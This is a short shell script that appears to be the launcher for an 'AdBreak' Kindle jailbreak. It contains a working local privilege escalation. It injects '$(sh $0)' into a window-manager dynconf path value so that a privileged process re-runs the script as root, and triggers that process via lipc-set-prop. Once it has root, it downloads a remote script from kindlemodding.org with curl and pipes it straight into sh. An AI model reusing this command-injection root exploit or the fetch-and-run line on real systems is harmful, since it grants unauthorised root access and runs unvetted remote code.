#!/bin/sh

# H^9's Initial LPE;
if [ "$(id -u)" -ne 0 ]; then
  set-dynconf-value winmgr.vibrancyMode.pref.path "\$(sh $0)"
  lipc-set-prop -s com.lab126.winmgr vibrancyMode "lol"
  exit 1
fi

set-dynconf-value winmgr.vibrancyMode.pref.path ""

curl -L https://kindlemodding.org/jb.sh | RUN_MODE=1 JB_HEADER="AdBreak Jailbreak" sh